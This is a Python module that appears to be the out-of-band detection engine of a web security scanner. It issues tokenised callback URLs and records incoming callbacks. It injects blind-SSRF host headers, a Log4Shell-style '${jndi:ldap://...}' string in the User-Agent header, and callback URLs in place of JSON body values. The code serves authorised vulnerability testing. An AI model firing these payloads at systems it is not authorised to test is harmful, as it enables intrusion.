from __future__ import annotations

import os
import time
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse


DEFAULT_CALLBACK_BASE = os.getenv("AASE_OAST_BASE_URL", "http://127.0.0.1:8010")


def _normalize_callback_base(base_url: Optional[str]) -> str:
    candidate = (base_url or DEFAULT_CALLBACK_BASE).strip().rstrip("/")
    if not candidate.startswith(("http://", "https://")):
        candidate = "http://" + candidate
    return candidate


class OASTEngine:
    registry: Dict[str, Dict[str, Any]] = {}

    def __init__(self, scan_id: str, callback_base_url: Optional[str] = None) -> None:
        self.scan_id = scan_id
        self.callback_base_url = _normalize_callback_base(callback_base_url)

    @classmethod
    def register_payload(
        cls,
        scan_id: str,
        endpoint_id: str,
        endpoint_path: str,
        vector_type: str,
        callback_base_url: Optional[str] = None,
        request_url: str = "",
        case_id: str = "oast",
    ) -> Dict[str, str]:
        token = uuid.uuid4().hex[:16]
        base = _normalize_callback_base(callback_base_url)
        callback_url = f"{base}/api/oast/{token}"
        callback_domain = urlparse(callback_url).netloc
        cls.registry[token] = {
            "token": token,
            "scan_id": scan_id,
            "endpoint_id": endpoint_id,
            "endpoint_path": endpoint_path,
            "vector_type": vector_type,
            "case_id": case_id,
            "request_url": request_url,
            "callback_url": callback_url,
            "callback_domain": callback_domain,
            "registered_at": time.time(),
            "callbacks": [],
            "finding_emitted": False,
        }
        return {
            "token": token,
            "callback_url": callback_url,
            "callback_domain": callback_domain,
        }

    @classmethod
    def record_callback(
        cls,
        token: str,
        method: str,
        headers: Dict[str, str],
        body: bytes,
        client_ip: str,
    ) -> Optional[Dict[str, Any]]:
        event = cls.registry.get(token)
        if not event:
            return None
        event["callbacks"].append(
            {
                "timestamp": time.time(),
                "method": method,
                "headers": dict(headers),
                "body": body.decode("utf-8", errors="ignore")[:4000],
                "client_ip": client_ip,
            }
        )
        return event

    @classmethod
    def get_scan_events(cls, scan_id: str) -> List[Dict[str, Any]]:
        return [value for value in cls.registry.values() if value.get("scan_id") == scan_id]

    def inject_oast_headers(
        self,
        original_headers: Dict[str, str],
        endpoint_id: str,
        endpoint_path: str,
        request_url: str = "",
    ) -> Dict[str, str]:
        headers = dict(original_headers)

        ssrf_payload = self.register_payload(
            self.scan_id,
            endpoint_id,
            endpoint_path,
            "blind_ssrf_header",
            callback_base_url=self.callback_base_url,
            request_url=request_url,
            case_id="oast_header",
        )
        headers["X-Forwarded-Host"] = ssrf_payload["callback_domain"]
        headers["X-Host"] = ssrf_payload["callback_domain"]
        headers["Forwarded"] = f"for=127.0.0.1;host={ssrf_payload['callback_domain']}"

        jndi_payload = self.register_payload(
            self.scan_id,
            endpoint_id,
            endpoint_path,
            "jndi_header",
            callback_base_url=self.callback_base_url,
            request_url=request_url,
            case_id="oast_header",
        )
        jndi_url = jndi_payload["callback_url"].replace("http://", "ldap://").replace("https://", "ldaps://")
        headers["User-Agent"] = f"${{jndi:{jndi_url}/a}}"
        headers["Referer"] = jndi_payload["callback_url"]
        headers["X-Api-Version"] = jndi_payload["callback_url"]
        return headers

    def inject_oast_body(
        self,
        parsed_json: Dict[str, Any],
        endpoint_id: str,
        endpoint_path: str,
        request_url: str = "",
    ) -> Dict[str, Any]:
        mutated = dict(parsed_json)

        def _walk(node: Any) -> None:
            if isinstance(node, dict):
                for key, value in list(node.items()):
                    if isinstance(value, str):
                        payload = self.register_payload(
                            self.scan_id,
                            endpoint_id,
                            endpoint_path,
                            "blind_body",
                            callback_base_url=self.callback_base_url,
                            request_url=request_url,
                            case_id="oast_body",
                        )
                        if "@" in value:
                            node[key] = f"admin@{payload['callback_domain']}"
                        else:
                            node[key] = payload["callback_url"]
                    elif isinstance(value, (dict, list)):
                        _walk(value)
            elif isinstance(node, list):
                for index, value in enumerate(list(node)):
                    if isinstance(value, str):
                        payload = self.register_payload(
                            self.scan_id,
                            endpoint_id,
                            endpoint_path,
                            "blind_body",
                            callback_base_url=self.callback_base_url,
                            request_url=request_url,
                            case_id="oast_body",
                        )
                        node[index] = payload["callback_url"]
                    elif isinstance(value, (dict, list)):
                        _walk(value)

        _walk(mutated)
        return mutated

